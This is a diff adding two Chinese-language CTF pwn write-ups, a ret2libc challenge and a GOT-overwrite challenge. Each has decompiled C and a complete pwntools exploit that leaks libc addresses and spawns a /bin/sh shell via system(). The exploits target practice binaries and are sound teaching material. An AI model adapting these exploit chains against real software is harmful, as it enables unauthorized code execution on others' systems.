@@ -207,6 +207,201 @@ s.interactive()
 
 ```
 
+### [Week1] 我后门呢
+
+> aka ret2libc
+>
+> 目前只要知道，parital relro 下，调用库函数一次之后，got 表中会存放 libc 相关地址即可。剩余内容可以参考 ctf-wiki。
+
+题目没有给后门函数，并且只开启了 NX 保护。此外，题目还提供了 libc.so.6 附件，可以使用 ret2libc。
+
+首先，使用 ida 打开 libc.so.6 文件，可以得到版本为 2.31-0ubuntu9.9_amd64。这个版本在 glibc-all-in-one 中无法直接搜索到，可以在 https://launchpad.net/ubuntu/+source/glibc/2.31-0ubuntu9.9 上下载。下载了对应的 deb 文件后，使用 glibc-all-in-one 的 extract 工具提取出对应的 ld-linux-x86-64.so.2，并使用 `patchelf ./ret2libc --set-interpreter path/to/ld-linux-x86-64.so.2` 和 `patchelf ./ret2libc --add-needed path/to/libc.so.6` 来指定正确的链接器和库。
+
+之后，开始分析程序：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  bufinit(argc, argv, envp);
+  puts("There won't be shell for you!");
+  puts("Now give me your input:");
+  read(0, buf, 0x100uLL);
+  if ( strlen(buf) > 0x20 )
+  {
+    puts("No chance for you to overflow!");
+    exit(1);
+  }
+  puts("See you next time!");
+  return 0;
+}
+```
+
+可以发现，存在一个 read 溢出点。`strlen()` 判断字符串长度的方式是一直读取知道遇到 `\0`，所以我们直接往字符串前面填入 `\0` 即可。
+
+```python
+from pwn import *
+context(arch="amd64", os="linux")
+io = process('./ret2libc', 'b main')
+
+elf = ELF('./ret2libc')
+libc = ELF('./libc.so.6')
+
+rdi = 0x401333  # pop rdi（另见 ret2csu）
+
+payload1 = flat([
+    b'\0'*0x28,
+    # 泄漏 got 表
+    rdi, elf.got.read,
+    elf.plt.puts,
+    # 重新执行 main 函数以继续利用 read 函数
+    elf.sym.main
+])
+
+io.recvuntil(b'input:\n')
+io.sendline(payload1)
+io.recvuntil(b'time!\n')
+
+# u64() 接收一个 8 字节字符序列并解包为对应的地址
+# 地址的高位一定是 \0，比如 0x00007f706a508fc0，输出时会被 puts 截断
+# 所以可以保证 recvline() 得到的字符序列去掉行尾 \n 后一定是 8 字节以内的
+# 最后使用 ljust(8, b"\0")) 向高位补齐 \0 即可
+# 得到的地址是真实的 read 地址，减去 read 在 libc 中的偏移量即可得到 libc 基址
+libc.address = u64(io.recvline()[:-1].ljust(8, b"\0")) - libc.sym.read
+
+payload2 = flat([
+    b'\0'*0x28,
+    # system 函数中有使用到 movups xmmword 相关汇编指令，需要对栈进行对齐
+    # 这里 rdi + 1 是一个 retn 语句，根据 rop 链的特性，可以返回到自己
+    # 从而让栈多了一字节，实现对齐操作（另见栈对齐）
+    rdi + 1,
+    # libc.search 搜索 elf 文件中的文本，返回的是一个迭代器
+    # 使用 next() 得到第一个 /bin/sh 所在的地址
+    rdi, next(libc.search(b'/bin/sh')),
+    # 当设置了 libc.address 后，plt, got, sym 的地址均会自动更新
+    libc.sym.system
+])
+
+io.recvuntil(b'input:')
+io.sendline(payload2)
+
+io.interactive()
+```
+
+### [Week1] got-it
+
+> 延迟绑定，got表里存的究竟是啥
+
+```c
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int v3; // [rsp+Ch] [rbp-4h] BYREF
+
+  bufinit(argc, argv, envp);
+  while ( 1 )
+  {
+    menu();
+    __isoc99_scanf("%d", &v3);
+    if ( v3 == 8227 )
+      break;
+    if ( v3 <= 8227 )
+    {
+      if ( v3 == 4 )
+      {
+        puts("Thanks for using!");
+        exit(0);
+      }
+      if ( v3 <= 4 )
+      {
+        switch ( v3 )
+        {
+          case 3:
+            edit();
+            break;
+          case 1:
+            add();
+            break;
+          case 2:
+            show();
+            break;
+        }
+      }
+    }
+  }
+  trick();
+}
+```
+
+可以看出，这一题是一个简单的管理系统，输入 1 可以写入数据，2 可以查看数据，8227（0x2023）可以执行 `trick()` 函数。
+
+```c
+int show()
+{
+  int result; // eax
+  int v1; // [rsp+Ch] [rbp-4h] BYREF
+
+  printf("Input student id: ");
+  __isoc99_scanf("%d", &v1);
+  if ( v1 <= 15 )
+    result = printf("Student name: %s\n", &list[8 * v1]);
+  else
+    result = puts("Invalid id!");
+  return result;
+}
+int add()
+{
+  int v1; // [rsp+Ch] [rbp-4h] BYREF
+
+  printf("Input student id: ");
+  __isoc99_scanf("%d", &v1);
+  if ( v1 > 15 )
+    return puts("Invalid id!");
+  printf("Input student name: ");
+  return read(0, (char *)&list + 8 * v1, 8uLL);
+}
+void __noreturn trick()
+{
+  exit((int)"/bin/sh");
+}
+```
+
+仔细观察，发现 `show()` 和 `add()` 均只对 id 的最大值进行了限制，没有对最小值进行限制。list 位于 .bss 段，可以通过写入负数来访问 got 表。`trick()` 中的 `exit()` 函数已经给定了 `/bin/sh` 参数，如果我们可以把 `exit()` 劫持成 `system()` 函数，即可得到权限。
+
+```python
+from pwn import *
+
+context(os='linux', arch='amd64')
+
+elf = ELF('./got-it')
+libc = ELF('./libc.so.6')
+
+io = process('./got-it')
+
+io.recvuntil('>> ')
+io.sendline('2')
+io.recvuntil('id: ')
+# show 泄漏 got 表
+io.sendline(str(int((elf.got.puts-elf.sym.list)/8)))
+io.recvuntil('name: ')
+libc.address = u64(io.recvline()[:-1].ljust(8, b'\0'))-libc.sym.puts
+
+io.recvuntil('>> ')
+io.sendline('1')
+io.recvuntil('id: ')
+io.sendline(str(int((elf.got.exit-elf.sym.list)/8)))
+io.recvuntil('name: ')
+# 把 exit 劫持成 system
+io.sendline(p64(libc.sym.system))
+
+io.recvuntil('>> ')
+io.sendline('8227')
+
+io.interactive()
+```
+
+
+
 ### [Week3] all-in-files
 
 > 一切皆文件是一种哲学
